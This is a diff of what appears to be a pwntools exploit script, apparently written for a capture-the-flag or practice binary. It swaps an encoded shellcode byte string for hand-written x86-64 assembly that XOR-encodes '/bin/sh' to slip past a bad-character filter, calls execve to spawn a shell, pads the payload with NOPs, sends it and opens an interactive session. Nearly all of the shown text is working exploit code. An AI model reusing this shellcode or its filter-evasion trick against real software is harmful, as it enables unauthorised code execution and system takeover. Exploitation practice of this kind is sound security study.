@@ -206,7 +206,6 @@ print(f"Sending big shellcode")
 print(f"Big payload len: {len(BigPayload)}")
 print(f"Big payload: {(BigPayload.hex())}")
 
-
 print(BigPayload)
 io.sendline(BigPayload)
 
@@ -662,15 +661,23 @@ FD = 1000
 badChar = "abcdefghijklmonpqurtsABCD/binshh".encode("ascii")
 badChar = badChar.hex()
 
-buf = b""
-buf += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d"
-buf += b"\x05\xef\xff\xff\xff\x48\xbb\xcb\x84\x85\x90\xe1"
-buf += b"\xd6\xd3\xc2\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
-buf += b"\xff\xe2\xf4\x83\x3c\xaa\xf2\x88\xb8\xfc\xb1\xa3"
-buf += b"\x84\x1c\xc0\xb5\x89\x81\xa4\xa3\xa9\xe6\xc4\xbf"
-buf += b"\x84\x3b\xca\xcb\x84\x85\xbf\x83\xbf\xbd\xed\xb8"
-buf += b"\xec\x85\xc6\xb6\x82\x8d\xa8\xf0\xdc\x8a\x95\xe1"
-buf += b"\xd6\xd3\xc2"
+secret_key = 0xFF_FF_FF_FF_FF_FF_FF_FF
+binsh = u64(b"/bin/sh\x00")
+bish_encrypted = binsh ^ 0xFF_FF_FF_FF_FF_FF_FF_FF
+EXECVE = 0x3B
+
+shellcode = f""" 
+mov rax, {EXECVE}
+xor rdx, rdx
+xor rsi, rsi
+mov rbx, {bish_encrypted}
+xor rbx, 0xFFFFFFFFFFFFFFFF
+push rbx
+mov rdi, rsp
+syscall
+"""
+
+buf: bytes = asm(shellcode, arch="amd64", os="linux")
 
 buf_len = len(buf)
 NOP = b"\x90"
@@ -729,5 +736,4 @@ print("____________________________________")
 # print(res)
 
 io.interactive()
-
 ```
